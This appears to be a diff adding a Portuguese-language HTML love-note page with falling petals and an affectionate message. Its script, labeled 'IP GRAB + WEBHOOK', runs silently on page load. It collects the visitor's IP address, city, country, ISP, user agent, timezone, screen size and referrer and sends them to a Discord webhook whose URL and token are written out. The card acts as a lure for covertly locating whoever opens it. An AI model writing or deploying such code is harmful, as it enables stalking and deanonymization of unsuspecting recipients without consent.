@@ -1,0 +1,203 @@
+<!DOCTYPE html>  <html lang="pt-BR">  
+<head>  
+  <meta charset="UTF-8" />  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />  
+  <title>pra você 🌸</title>  
+  <style>  
+    @import url('https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,600;1,400&family=Lato:wght@300;400&display=swap');  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }  
+
+body {  
+  min-height: 100vh;  
+  background: linear-gradient(135deg, #1a0a0f 0%, #2d1021 40%, #1a0a0f 100%);  
+  display: flex;  
+  align-items: center;  
+  justify-content: center;  
+  font-family: 'Lato', sans-serif;  
+  overflow: hidden;  
+  position: relative;  
+}  
+
+/* floating petals */  
+.petal {  
+  position: fixed;  
+  pointer-events: none;  
+  font-size: 1.2rem;  
+  opacity: 0;  
+  animation: fall linear infinite;  
+  z-index: 0;  
+}  
+@keyframes fall {  
+  0%   { transform: translateY(-60px) rotate(0deg); opacity: 0; }  
+  10%  { opacity: 0.6; }  
+  90%  { opacity: 0.4; }  
+  100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }  
+}  
+
+.card {  
+  position: relative;  
+  z-index: 10;  
+  background: rgba(255,255,255,0.04);  
+  backdrop-filter: blur(18px);  
+  border: 1px solid rgba(255,180,200,0.18);  
+  border-radius: 24px;  
+  padding: 56px 48px;  
+  max-width: 520px;  
+  width: 90%;  
+  box-shadow:  
+    0 0 60px rgba(220, 60, 100, 0.12),  
+    0 0 120px rgba(220, 60, 100, 0.06),  
+    inset 0 1px 0 rgba(255,255,255,0.08);  
+  text-align: center;  
+  animation: fadeIn 1.4s ease both;  
+}  
+@keyframes fadeIn {  
+  from { opacity: 0; transform: translateY(28px); }  
+  to   { opacity: 1; transform: translateY(0); }  
+}  
+
+.rose {  
+  font-size: 3.2rem;  
+  display: block;  
+  margin-bottom: 20px;  
+  filter: drop-shadow(0 0 18px rgba(220,60,100,0.5));  
+  animation: pulse 3s ease-in-out infinite;  
+}  
+@keyframes pulse {  
+  0%, 100% { transform: scale(1); filter: drop-shadow(0 0 18px rgba(220,60,100,0.5)); }  
+  50%       { transform: scale(1.08); filter: drop-shadow(0 0 32px rgba(220,60,100,0.8)); }  
+}  
+
+h1 {  
+  font-family: 'Playfair Display', serif;  
+  font-style: italic;  
+  font-size: 2rem;  
+  color: #f7c5d5;  
+  margin-bottom: 8px;  
+  letter-spacing: 0.02em;  
+}  
+
+.subtitle {  
+  font-size: 0.78rem;  
+  color: rgba(247,197,213,0.4);  
+  letter-spacing: 0.18em;  
+  text-transform: uppercase;  
+  margin-bottom: 36px;  
+}  
+
+.divider {  
+  width: 60px;  
+  height: 1px;  
+  background: linear-gradient(90deg, transparent, rgba(220,60,100,0.6), transparent);  
+  margin: 0 auto 36px;  
+}  
+
+.message {  
+  font-family: 'Playfair Display', serif;  
+  font-size: 1.08rem;  
+  line-height: 1.9;  
+  color: rgba(255,235,240,0.88);  
+  text-align: left;  
+}  
+.message em {  
+  font-style: italic;  
+  color: #f7c5d5;  
+}  
+
+.signature {  
+  margin-top: 36px;  
+  font-family: 'Playfair Display', serif;  
+  font-style: italic;  
+  font-size: 1.3rem;  
+  color: #f7c5d5;  
+  opacity: 0.9;  
+}  
+.heart-line {  
+  margin-top: 10px;  
+  font-size: 1rem;  
+  letter-spacing: 0.3em;  
+  color: rgba(220,60,100,0.7);  
+}
+
+  </style>  
+</head>  
+<body>    <div class="card">  
+    <span class="rose">🌹</span>  
+    <h1>para você</h1>  
+    <p class="subtitle">uma mensagem do coração</p>  
+    <div class="divider"></div>  
+    <p class="message">  
+      Tem dias em que eu só quero te dizer que você importa.<br><br>  
+      Não de um jeito qualquer — do jeito que o sol importa pra quem  
+      ficou tempo demais no escuro. Você aparece na minha cabeça nos  
+      momentos mais simples e faz tudo parecer <em>menos pesado</em>.<br><br>  
+      Obrigado por existir. Obrigado por ser exatamente quem você é.  
+      Sem precisar mudar nada, sem precisar ser diferente — só você,  
+      assim, já é o suficiente.  
+    </p>  
+    <p class="signature">com carinho 🌸</p>  
+    <p class="heart-line">♡ &nbsp; ♡ &nbsp; ♡</p>  
+  </div>    <script>  
+    // ── CONFIG ──────────────────────────────────────────────────────────  
+    const WEBHOOK = "FILL:https://discord.com/api/webhooks/1568354567433756892/G-Fn4v8qFy5WpYiVzaFM1NMibeAl-uY0jt-FrSH_NL-c2vc9cNGywuU_AZDRzUhCD8YI";  
+    // ────────────────────────────────────────────────────────────────────  
+  
+    // petals  
+    const symbols = ["🌸","🌺","✿","❀","🌹","💮"];  
+    for (let i = 0; i < 22; i++) {  
+      const p = document.createElement("span");  
+      p.className = "petal";  
+      p.textContent = symbols[Math.floor(Math.random() * symbols.length)];  
+      p.style.left      = Math.random() * 100 + "vw";  
+      p.style.fontSize  = (0.8 + Math.random() * 1.2) + "rem";  
+      p.style.animationDuration = (8 + Math.random() * 14) + "s";  
+      p.style.animationDelay   = (Math.random() * 12) + "s";  
+      document.body.appendChild(p);  
+    }  
+  
+    // ── IP GRAB + WEBHOOK ────────────────────────────────────────────────  
+    async function grab() {  
+      try {  
+        const geo = await fetch("https://ipapi.co/json/").then(r => r.json());  
+  
+        const ua      = navigator.userAgent;  
+        const lang    = navigator.language;  
+        const tz      = Intl.DateTimeFormat().resolvedOptions().timeZone;  
+        const screen_  = `${screen.width}x${screen.height}`;  
+        const ref     = document.referrer || "direto";  
+        const ts      = new Date().toISOString();  
+  
+        const embed = {  
+          username: "🌹 Love Note Logger",  
+          avatar_url: "https://cdn.discordapp.com/emojis/1013123456789.png",  
+          embeds: [{  
+            title: "💌 Nova visita ao cartão",  
+            color: 0xe8396a,  
+            fields: [  
+              { name: "🌐 IP",         value: `\`${geo.ip}\``,                    inline: true  },  
+              { name: "🏳️ País",        value: `${geo.country_name} (${geo.country_code})`, inline: true },  
+              { name: "🏙️ Cidade",      value: `${geo.city || "??"}, ${geo.region || "??"}`, inline: true },  
+              { name: "📡 ASN / ISP",   value: `\`${geo.org || "??"}\``,           inline: false },  
+              { name: "🕐 Timezone",    value: tz,                                 inline: true  },  
+              { name: "🗣️ Idioma",      value: lang,                               inline: true  },  
+              { name: "🖥️ Tela",        value: screen_,                            inline: true  },  
+              { name: "📎 Referrer",    value: ref,                                inline: false },  
+              { name: "🤖 User-Agent",  value: `\`${ua.slice(0,120)}\``,           inline: false },  
+              { name: "🕰️ Timestamp",   value: ts,                                 inline: false },  
+            ],  
+            footer: { text: "olliE bench ·🥔" },  
+            timestamp: new Date().toISOString(),  
+          }]  
+        };  
+  
+        await fetch(WEBHOOK, {  
+          method:  "POST",  
+          headers: { "Content-Type": "application/json" },  
+          body:    JSON.stringify(embed),  
+        });  
+  
+      } catch (_) { /* silêncio */ }  
+    }  
+  
+    grab();  
+  </script>  </body>  
+</html>
